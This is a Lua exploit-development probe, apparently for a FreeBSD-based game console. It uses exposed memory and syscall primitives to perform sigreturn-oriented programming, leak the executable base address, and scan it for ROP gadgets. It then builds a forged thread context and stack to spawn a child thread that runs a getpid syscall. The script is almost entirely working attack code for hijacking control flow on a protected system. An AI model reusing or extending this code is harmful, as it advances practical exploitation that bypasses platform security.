-- CRASH_CLASS: LOW
-- PROBE 185d: Minimal child thread getpid test
--
-- 185b/185c timed out (gadget scan too slow or script too big).
-- This is the minimal version: just create one child that does
-- getpid (syscall 20) and writes the result to a marker.

print("=== 185d: CHILD GETPID ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc=" .. hex64(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local _, gpu = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Eboot
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
print("eb=0x" .. string.format("%X%08X", eb_hi, eb_lo))

-- Known working gadgets from prior probes (156c/156d used these)
-- mov [rdi], rax; ret = 48 89 07 C3
-- jmp $ = EB FE
-- Scan only first 16KB for speed
local mov_g, jmp_g = nil, nil
for off = 0, 0x4000, 2 do
    local ok, w = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
    if not ok then break end
    local v = to_num(w)
    if v == 0xC3078948 and not mov_g then
        mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
        print("mov @" .. string.format("0x%X", off))
    end
    if not jmp_g and (v % 0x10000) == 0xFEEB then
        jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
        print("jmp @" .. string.format("0x%X", off))
    end
    if mov_g and jmp_g then break end
end

-- If not in first 16KB, extend to 64KB
if not mov_g or not jmp_g then
    print("extending to 64KB...")
    for off = 0x4000, 0x10000, 2 do
        local ok, w = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
        if not ok then break end
        local v = to_num(w)
        if v == 0xC3078948 and not mov_g then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("mov @" .. string.format("0x%X", off))
        end
        if not jmp_g and (v % 0x10000) == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("jmp @" .. string.format("0x%X", off))
        end
        if mov_g and jmp_g then break end
    end
end

if not mov_g then print("NO MOV GADGET") return end
if not jmp_g then print("NO JMP GADGET") return end

-- Child thread: getpid(20) then mov [rdi], rax; ret -> jmp $
-- RIP = sc_addr (syscall;ret)
-- RAX = 20 (getpid)
-- RDI = marker addr (preserved across getpid on FreeBSD)
-- [RSP+0] = mov_g
-- [RSP+8] = jmp_g
local MARKER = 0x10000
wq(gpu + MARKER, uint64(0))

local ST = 0x20000 - 16
wq(gpu + ST, mov_g)
wq(gpu + ST + 8, jmp_g)

local TC = 0x30000
for i = 0, 0x4FF, 8 do wq(gpu + TC + i, uint64(0)) end
wq(gpu + TC + 0x108, uint64(0x480))
wd(gpu + TC + 0x0D0, 0)
wq(gpu + TC + 0x110, uint64(0x10000))
wd(gpu + TC + 0x0C0, 0x43)
wd(gpu + TC + 0x100, 0x3B)
wq(gpu + TC + 0x0E0, sc_addr)
wq(gpu + TC + 0x0F8, ga(ST))
wq(gpu + TC + 0x048, ga(MARKER))  -- RDI = marker
wq(gpu + TC + 0x078, uint64(20))  -- RAX = getpid

local tb = memory.alloc(8)
wd(tb, 0)
local rv = srop(430, ga(TC), uint64(tb))
local cr = rv and to_num(rv) or -999
local ct = rd(tb)
print("create=" .. cr .. " tid=0x" .. string.format("%X", ct))

-- Wait 100ms
local TS = 0x38000
wq(gpu + TS, uint64(0))
wq(gpu + TS + 8, uint64(100000000))
srop(240, ga(TS), uint64(0))

local m = rq(gpu + MARKER)
local mval = to_num(m)
print("marker=" .. hex64(m) .. " (" .. mval .. ")")
print("pid=" .. pid)

if mval == pid then
    print("!!! CHILD GETPID MATCHES — CHILD SYSCALLS WORK !!!")
elseif mval > 0 then
    print("child wrote " .. mval .. " (nonzero but not pid)")
end

if ct > 0 then
    rv = srop(431, uint64(ct), uint64(0))
    print("alive=" .. (rv and to_num(rv) or -999))
end

print("=== DONE ===")
